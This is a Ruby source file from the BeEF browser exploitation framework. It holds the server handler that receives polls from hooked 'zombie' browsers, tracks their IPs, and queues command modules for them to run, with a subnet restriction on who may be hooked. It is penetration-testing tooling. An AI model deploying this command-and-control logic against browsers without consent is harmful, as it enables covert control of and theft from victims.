#
#   Copyright 2012 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
module BeEF
module Core
module Handlers
  
   # @note This class handles connections from hooked browsers to the framework.
    class HookedBrowsers

    
    include BeEF::Core::Handlers::Modules::BeEFJS
    include BeEF::Core::Handlers::Modules::Command

    
    # Process HTTP requests sent by a hooked browser to the framework.
    # It will update the database to add or update the current hooked browser
    # and deploy some command modules or extensions to the hooked browser.
    def call(env)
      @body = ''
      @request = Rack::Request.new(env)
      @params = @request.query_string
      @response = Rack::Response.new(body=[], 200, header={})
      config = BeEF::Core::Configuration.instance
      
      # @note check source ip address of browser
      permitted_hooking_subnet = config.get('beef.restrictions.permitted_hooking_subnet')
      target_network = IPAddr.new(permitted_hooking_subnet)
      if not target_network.include?(@request.ip)
        BeEF::Core::Logger.instance.register('Target Range', "Attempted hook from out of target range browser (#{@request.ip}) rejected.")
        @response = Rack::Response.new(body=[], 500, header={})
        return
      end

      # @note get zombie if already hooked the framework
      hook_session_name = config.get('beef.http.hook_session_name')
      hook_session_id = @request[hook_session_name]
      hooked_browser = BeEF::Core::Models::HookedBrowser.first(:session => hook_session_id) if not hook_session_id.nil?

      # @note is a new browser so return instructions to set up the hook
      if not hooked_browser 
        
        # @note generate the instructions to hook the browser
        host_name = @request.host 
        (print_error "Invalid host name";return) if not BeEF::Filters.is_valid_hostname?(host_name)
        build_beefjs!(host_name)

      # @note is a known browser so send instructions 
      else       
        # @note record the last poll from the browser
        hooked_browser.lastseen = Time.new.to_i
        
        # @note Check for a change in zombie IP and log an event
        if hooked_browser.ip != @request.ip
          BeEF::Core::Logger.instance.register('Zombie',"IP address has changed from #{hooked_browser.ip} to #{@request.ip}","#{hooked_browser.id}")
          hooked_browser.ip = @request.ip
        end
      
        hooked_browser.count!
        hooked_browser.save
        
        # @note add all available command module instructions to the response
        zombie_commands = BeEF::Core::Models::Command.all(:hooked_browser_id => hooked_browser.id, :instructions_sent => false)
        zombie_commands.each{|command| add_command_instructions(command, hooked_browser)}

        # @note We dynamically get the list of all browser hook handler using the API and register them
        BeEF::API::Registrar.instance.fire(BeEF::API::Server::Hook, 'pre_hook_send', hooked_browser, @body, @params, @request, @response)
      end

      # @note set response headers and body
      @response = Rack::Response.new(
            body = [@body],
            status = 200,
            header = {
              'Pragma' => 'no-cache',
              'Cache-Control' => 'no-cache',
              'Expires' => '0',
              'Content-Type' => 'text/javascript',
              'Access-Control-Allow-Origin' => '*',
              'Access-Control-Allow-Methods' => 'POST, GET'
            }
        )
      
    end

    private
    
    # @note Object representing the HTTP request
    @request
    
    # @note Object representing the HTTP response
    @response
    
    # @note A string containing the list of BeEF components active in the hooked browser
    # @todo Confirm this variable is still used
    @beef_js_cmps
    
  end
  
end
end
end
